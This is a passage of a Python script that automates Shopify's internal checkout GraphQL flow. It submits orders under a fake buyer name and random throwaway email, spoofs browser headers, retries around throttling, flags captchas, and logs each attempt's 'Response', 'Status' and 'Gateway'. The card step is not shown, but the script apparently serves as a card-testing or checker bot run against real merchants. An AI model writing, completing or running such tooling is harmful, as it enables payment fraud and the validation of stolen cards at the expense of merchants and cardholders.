zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}subtotalAfterMerchandiseDiscounts{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}',
            'variables': {
                'sessionInput': {
                    'sessionToken': x_checkout_one_session_token,
                },
                'queueToken': queue_token,
                'discounts': {
                    'lines': [],
                    'acceptUnexpectedDiscounts': True,
                },
                'delivery': {
                    'deliveryLines': [
                        {
                            'destination': {
                                'partialStreetAddress': {
                                    'address1': addr["address1"],
                                    'city': addr["city"],
                                    'countryCode': addr["countryCode"],
                                    'postalCode': addr["postalCode"],
                                    'firstName': 'Laka',
                                    'lastName': 'Lama',
                                    'zoneCode': addr["zoneCode"],
                                    'phone': addr["phone"],
                                    'oneTimeUse': False,
                                },
                            },
                            'selectedDeliveryStrategy': {
                                'deliveryStrategyMatchingConditions': {
                                    'estimatedTimeInTransit': {
                                        'any': True,
                                    },
                                    'shipments': {
                                        'any': True,
                                    },
                                },
                                'options': {},
                            },
                            'targetMerchandiseLines': {
                                'any': True,
                            },
                            'deliveryMethodTypes': [
                               'SHIPPING',
                               'LOCAL',
                            ],
                            'expectedTotalPrice': {
                                'any': True,
                            },
                            'destinationChanged': False,
                        },
                    ],
                    'noDeliveryRequired': [],
                    'useProgressiveRates': False,
                    'prefetchShippingRatesStrategy': None,
                    'supportsSplitShipping': True,
                },
                'deliveryExpectations': {
                    'deliveryExpectationLines': [],
                },
                'merchandise': {
                    'merchandiseLines': [
                        {
                            'stableId': stable_id,
                            'merchandise': {
                                'productVariantReference': {
                                    'id': f'gid://shopify/ProductVariantMerchandise/{product_id}',
                                    'variantId': f'gid://shopify/ProductVariant/{product_id}',
                                    'properties': [],
                                    'sellingPlanId': None,
                                    'sellingPlanDigest': None,
                                },
                            },
                            'quantity': {
                                'items': {
                                    'value': 1,
                                },
                            },
                            'expectedTotalPrice': {
                                'value': {
                                    'amount': f"{price}",
                                    'currencyCode': f'{addr["currencyCode"]}',
                                },
                            },
                            'lineComponentsSource': None,
                            'lineComponents': [],
                        },
                    ],
                },
                'memberships': {
                    'memberships': [],
                },
                'payment': {
                    'totalAmount': {
                        'any': True,
                    },
                    'paymentLines': [],
                    'billingAddress': {
                        'streetAddress': {
                            'address1': addr["address1"],
                            'city': addr["city"],
                            'countryCode': addr["countryCode"],
                            'postalCode': addr["postalCode"],
                            'firstName': 'Laka',
                            'lastName': 'Lama',
                            'zoneCode': addr["zoneCode"],
                            'phone': addr["phone"],
                        },
                    },
                },
                'buyerIdentity': {
                    'customer': {
                        'presentmentCurrency': f'{addr["currencyCode"]}',
                        'countryCode': f'{countryCode}',
                    },
                    'email': f"gmail{__import__('random').randint(100000,999999)}@gmail.com",
                    'emailChanged': False,
                    'phoneCountryCode': f'{countryCode}',
                    'marketingConsent': [],
                    'shopPayOptInPhone': {
                        'countryCode': f'{countryCode}',
                    },
                    'rememberMe': False,
                },
                'tip': {
                    'tipLines': [],
                },
                'taxes': {
                    'proposedAllocations': None,
                    'proposedTotalAmount': {
                        'value': {
                            'amount': f"{tax2}",
                            'currencyCode': f'{addr["currencyCode"]}',
                        },
                    },
                    'proposedTotalIncludedAmount': None,
                    'proposedMixedStateTotalAmount': None,
                    'proposedExemptions': [],
                },
                'note': {
                    'message': None,
                    'customAttributes': [],
                },
                'localizationExtension': {
                    'fields': [],
                },

                'nonNegotiableTerms': None,
                'scriptFingerprint': {
                    'signature': None,
                    'signatureUuid': None,
                    'lineItemScriptChanges': [],
                    'paymentScriptChanges': [],
                    'shippingScriptChanges': [],
                },
                'optionalDuties': {
                    'buyerRefusesDuties': False,
                },
                'captcha': None,
                'cartMetafields': [],
            },
            'operationName': 'Proposal',
        }
        
        request = None
        for attempt in range(7):
            # Removed tokenization
            req = await session.post(f'{url}/checkouts/internal/graphql/persisted', params=params, headers=headers, json=json_data, timeout=22)
            req_text = (req.text or "").strip()
            req_sc = getattr(req, "status_code", 0)

            if req_sc != 200:
                if attempt < 6 and req_sc in (429, 502, 503, 504):
                    backoff = 2.0 + attempt * 1.0 if req_sc == 429 else 1.0 + attempt * 0.6
                    await asyncio.sleep(backoff)
                    continue
                output.update({"Response": f"NEGOTIATE_HTTP_{req_sc}", "Status": False})
                _log_output_to_terminal(output)
                return output

            if req_text.startswith("<"):
                if any(x in req_text.lower() for x in ["captcha", "hcaptcha", "recaptcha"]):
                    output.update({"Response": "HCAPTCHA_DETECTED", "Status": False})
                    _log_output_to_terminal(output)
                    return output
                output.update({"Response": "NEGOTIATE_HTML_ERROR", "Status": False})
                _log_output_to_terminal(output)
                return output

            if "signedHandle" in req_text:
                request = req
                break

            try:
                if not hasattr(req, 'json'):
                    await asyncio.sleep(0.8 + attempt * 0.4)
                    continue
                data = req.json()
                if not data or not isinstance(data, dict):
                    await asyncio.sleep(0.8 + attempt * 0.4)
                    continue
                res = (data.get("data") or {}).get("session") or {}
                neg = (res.get("negotiate") or {}).get("result") or {}
                if neg.get("__typename") == "Throttled":
                    poll_ms = (neg.get("pollAfter") or 0)
                    if poll_ms and poll_ms < 10000:
                        await asyncio.sleep(min(poll_ms / 1000.0, 4.0))
                    else:
                        await asyncio.sleep(1.0 + attempt * 0.5)
                else:
                    await asyncio.sleep(0.8 + attempt * 0.4)
            except (json.JSONDecodeError, TypeError, AttributeError, Exception):
                await asyncio.sleep(0.8 + attempt * 0.4)
            request = req

        if request is None:
            output.update({"Response": "NEGOTIATE_NO_RESPONSE", "Status": False})
            _log_output_to_terminal(output)
            return output

        # Parse negotiate response with error handling
        try:
            negotiate_text = request.text if request.text else ""
            negotiate_data = request.json()
            seller_proposal = negotiate_data["data"]["session"]["negotiate"]["result"]["sellerProposal"]
            seller = seller_proposal["delivery"]["deliveryLines"][0]["availableDeliveryStrategies"][0]
            amount = seller["deliveryStrategyBreakdown"][0]["amount"]["value"]["amount"]
            tax3 = seller_proposal["tax"]["totalTaxAmount"]["value"]["amount"]
            
            try:
                total = seller_proposal["checkoutTotal"]["value"]["amount"]
            except:
                total = price
            
            handle = seller["handle"]
        except json.JSONDecodeError:
            output.update({
                "Response": "NEGOTIATE_INVALID_JSON",
                "Status": False,
            })
            _log_output_to_terminal(output)
            return output
        except (KeyError, TypeError, IndexError) as e:
            output.update({
                "Response": "DELIVERY_ERROR",
                "Status": False,
            })
            _log_output_to_terminal(output)
            return output
        if not handle:
            output.update({
                "Response": "HANDLE EMPTY ",
                "Status": False,
                "Gateway": gateway,
                "Price": total,
            })
            _log_output_to_terminal(output)
            return output

        # print(f"Handle: {handle}\nAmount: {amount}\nTotal Price: {total}")

        # delivery = request.json()["data"]["session"]["negotiate"]["result"]["sellerProposal"]["deliveryExpectations"]["deliveryExpectations"]
        #signedHandle1 = delivery[0]["signedHandle"]
#		signedHandle2 = delivery[1]["signedHandle"]
#		signedHandle3 = delivery[2]["signedHandle"]

        headers = {
            'authority': domain,
            'accept': 'application/json',
            'accept-language': 'en-US',
            'content-type': 'application/json',
            'origin': url,
            'referer': url,
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': f'{mobile}',
            'sec-ch-ua-platform': f'"{clienthint}"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'shopify-checkout-client': 'checkout-web/1.0',
            'user-agent': f'{getua}',
            'x-checkout-one-session-token': x_checkout_one_session_token,
            'x-checkout-web-build-id': web_build,
            'x-checkout-web-deploy-stage': 'production',
            'x-checkout-web-server-handling': 'fast',
            'x-checkout-web-server-rendering': 'yes',
            'x-checkout-web-source-id': token
        }

        params = {
            'operationName': 'SubmitForCompletion'
        }

        json_data = {
            'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{...on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{message{code localizedDescription __typename}target __typename}...on AcceptNewTermViolation{message{code localizedDescription __typename}target __typename}...on ConfirmChangeViolation{message{code localizedDescription __typename}from to __typename}...on UnprocessableTermViolation{message{code localizedDescription __typename}target __typename}...on UnresolvableTermViolation{message{code localizedDescription __typename}target __typename}...on ApplyChangeViolation{message{code localizedDescription __typename}target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on InputValidationError{field __typename}...on PendingTermViolation{__typename}__typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken buyerProposal{...BuyerProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments paymentExtensionBrand analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder payEscrowMayExist buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{splitShippingToggle deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{id brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}subtotalAfterMerchandiseDiscounts{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode 